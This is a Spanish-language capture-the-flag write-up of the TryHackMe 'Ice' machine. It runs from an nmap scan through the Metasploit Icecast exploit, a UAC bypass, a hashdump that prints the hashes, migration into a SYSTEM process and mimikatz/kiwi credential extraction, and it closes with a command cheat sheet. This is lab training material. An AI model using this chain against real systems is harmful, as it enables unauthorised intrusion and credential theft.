# Write-up Ice

## Reconocimiento

Empiezo con un reconocimiento de puertos usando `nmap`:

`db_nmap -sS -sV -O -T4 IP`

Con este escaneo saco los datos que pide la máquina:

- Puerto de MSRDP: `3389`
- Puerto de Icecast: `8000`
- Hostname detectado: `DARK-PC`

[Escaneo con nmap](images/nmap.png)

## Enumeracion

Una vez visto que el servicio interesante es Icecast, busco vulnerabilidades asociadas: 
[cve-search](images/cve-search0.png)
[cve-search](images/cve-search1.png)
[cve-search](images/cve-search.png)

https://www.cvedetails.com/cve/CVE-2004-1561/

Revisando CVEs, encuentro `CVE-2004-1561`, que además tiene un exploit público y encaja con la pista de TryHackMe.

Después de buscar módulos en Metasploit con `search icecast`, veo que el módulo disponible es:

`exploit/windows/http/icecast_header`

## Explotacion

Configuro `RHOSTS` y `LHOST`, lanzo el exploit y consigo una sesión de `meterpreter`.

## Post-Explotacion

### Enumeracion basica

Con la sesión abierta, empiezo comprobando el contexto en el que he caído:

- `getuid`
- `sysinfo`
- `pwd`

[sysinfo](images/sysinfo.png)
[getuid](images/getuid.png)

Luego reviso los privilegios actuales con `getprivs`:

[Privilegios iniciales](images/bad-privs.png)

Aquí se ve que los privilegios son bastante limitados, así que el siguiente paso es escalar.

## Escalada de privilegios

Para ver posibles vías de escalada, ejecuto:

`run post/multi/recon/local_exploit_suggester`

[exploits-vulns](images/exploits-vulns.png)

La propia sala sugiere utilizar:

`exploit/windows/local/bypassuac_eventvwr`

Dejo la sesión actual en segundo plano con `background`, asigno esa sesión al exploit con `set session <ID>` y lo ejecuto con `run`.

Esto abre una nueva sesión de `meterpreter`. 

Reviso otra vez los privilegios con `getprivs`:

[Privilegios tras la escalada](images/privs.png)

Ahora sí tengo un contexto mucho más útil para seguir avanzando.

### Hashes y migracion de proceso

Con privilegios elevados, hago un `hashdump` y obtengo los hashes del sistema:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
```

En este punto, TryHackMe pide interactuar con `lsass`, así que necesito migrar a un proceso que esté corriendo como `NT AUTHORITY\SYSTEM`, ya que la sesión actual todavía no me vale para eso.

Enumero procesos con `ps` y veo que una opción típica para migrar es `spoolsv.exe`, en este caso con PID `1264`.

[Proceso spoolsv.exe](images/spoolsv.png)

Migro a ese proceso con:

`migrate -P <PID>`

[Migración de proceso](images/migrate.png)

Después de migrar, ya quedo ejecutando como `NT AUTHORITY\SYSTEM`:

[Contexto NT AUTHORITY\SYSTEM](images/NTAUTH.png)

## Resultado

### Obtencion de credenciales

Como la máquina pide usar `kiwi`, cargo el plugin y ejecuto `creds_all` para extraer las credenciales en texto claro.

[Credenciales con kiwi](images/creds-kiwi.png)

Las credenciales obtenidas son:

- Username: `Dark`
- Domain: `DARK-PC`
- Password: `Password01!`


## Resumen de comandos directo a escalada

1. db_nmap -sS -sV -O -T4 10.128.146.75
2. use exploit/windows/http/icecast_header
3. SET RHOSTS IP - SET LHOST IP
4. run
5. background
6. use exploit/windows/local/bypassuac_eventvwr
7. SET SESSION <ID> - SET LHOST IP
8. run
9. hashdump
10. ps
11. migrate -P <PID> (buscar spoolsv.exe)
12. load kiwi
13. creds_all